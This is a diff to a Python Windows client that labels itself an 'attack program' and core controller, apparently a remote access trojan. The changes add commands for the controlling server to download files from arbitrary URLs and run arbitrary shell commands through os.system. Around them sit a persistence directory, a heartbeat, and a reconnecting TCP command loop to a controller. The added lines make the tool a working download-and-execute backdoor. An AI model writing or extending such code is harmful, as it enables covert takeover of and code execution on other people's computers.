@@ -11,6 +11,7 @@
 	up为上传文件
 	we为获取当前目录位置
 '''
+
 import os
 import socket
 import time
@@ -22,6 +23,7 @@ import win32api
 import uuid
 import shutil
 import json
+import urllib.request as ur
 
 
 def remove_dir(dir):
@@ -165,6 +167,16 @@ class WinControl():
 		return "None"
 
 
+	def download(self):
+
+		ur.urlretrieve(self.patha, self.pathb)
+		return "None"
+
+	def systemrun(self):
+
+		os.system(self.data)
+		return "None"
+
 class Socketz():
 
 	def __init__(self,host,port,data=""):
@@ -274,38 +286,56 @@ def cmdx(cmd):
 		return p
 
 
+	if cmd[0] == "get":
+		windows.patha = cmd[1]
+		windows.pathb = cmd[2]
+		p = windows.download()
+		return p
+
+
+	if cmd[0] == "sys":
+		windows.data = cmd[1]
+		p = windows.systemrun()
+		return p
+	
+
+
 
 def main():
 	print("攻击程序 客户端启动\n 核心主控程序")
 
-
+	print("开始判定是否有安装痕迹")
 	if os.path.exists(r"C:\sun32\center\windows"):
 		windows.patha = r"C:\sun32\center\windows\uuid.json"
 		uuid = windows.uuid_read()
+		print("控制程序配置ID已存在")
 		print(uuid)
 
 	else:
-		
 		os.makedirs(r"C:\sun32\center\windows")
 		windows.patha = r"C:\sun32\center\windows\uuid.json"
 		uuid = windows.uuid_write()
+		print("控制程序配置id不存在，创建ID")
 		print(uuid)
 
 
 	while True:
 		print("进入循环")
 
+		print("正在连接服务器")
 		sockc = Socketz(host="127.0.0.1"\
 			,port=2233)
 		sockc.data = uuid
 		sockc.connect()
+		print("连接完成！准备发送心跳")
 
 		cmd = sockc.heart()
 		if cmd == "stop":
 			sockc.stop()
-			print("开始等待")
+			print("心跳停止，开始等待")
 			time.sleep(5)
 		if cmd == "start":
+			print("心跳接入，开启tcp长连接")
 			sockc.long_tcp()
 		
 
@@ -321,8 +351,8 @@ if __name__=='__main__':
 			time.sleep(5)
 			print("核心出错！进行重启！")
 		
-'''
 
+'''
 
 
 
